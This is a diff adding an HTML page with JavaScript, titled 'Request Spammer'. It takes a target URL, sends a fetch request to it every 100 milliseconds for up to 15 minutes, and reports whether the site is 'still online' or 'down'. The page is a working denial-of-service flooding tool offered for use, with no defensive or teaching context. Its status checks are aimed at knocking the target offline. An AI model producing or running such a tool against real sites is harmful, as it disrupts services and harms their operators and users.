@@ -1,0 +1,110 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Spammer</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #1e1e1e;
+            color: white;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: #292929;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.1);
+        }
+        .btn {
+            background: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #218838;
+        }
+        .stop-btn {
+            background: red;
+        }
+        .stop-btn:hover {
+            background: darkred;
+        }
+        input {
+            width: 80%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Request Spammer</h1>
+        <input type="text" id="targetUrl" placeholder="Enter target URL" value="https://example.com">
+        <button class="btn" onclick="startSpamming()">Start Spamming</button>
+        <button class="btn stop-btn" onclick="stopSpamming()">Stop</button>
+        <p id="status"></p>
+    </div><script>
+    let spamInterval;
+    let spamTimeout;
+    let requestCount = 0;
+
+    function startSpamming() {
+        let targetUrl = document.getElementById("targetUrl").value;
+        if (!targetUrl) {
+            alert("Please enter a valid URL");
+            return;
+        }
+        document.getElementById("targetUrl").value = ""; // Clear the input field
+        document.getElementById("status").innerText = "Spamming...";
+        requestCount = 10000;
+        
+        spamInterval = setInterval(() => {
+            fetch(targetUrl)
+                .then(response => {
+                    console.log("Request Sent: " + response.status);
+                    checkWebsiteStatus(targetUrl);
+                })
+                .catch(error => console.error("Error:", error));
+            requestCount++;
+        }, 100);
+        
+        spamTimeout = setTimeout(() => {
+            stopSpamming();
+        }, 15 * 60 * 1000); // Stop after 15 minutes
+    }
+
+    function stopSpamming() {
+        clearInterval(spamInterval);
+        clearTimeout(spamTimeout);
+        document.getElementById("status").innerText = "Stopped after 15 minutes or manually.";
+        console.log("Spamming Stopped");
+    }
+
+    function checkWebsiteStatus(url) {
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    document.getElementById("status").innerText = "Website is still online.";
+                } else {
+                    document.getElementById("status").innerText = "Website might be down!";
+                }
+            })
+            .catch(error => {
+                document.getElementById("status").innerText = "Website is down!";
+            });
+    }
+      </script>
+   </body>
+</html>
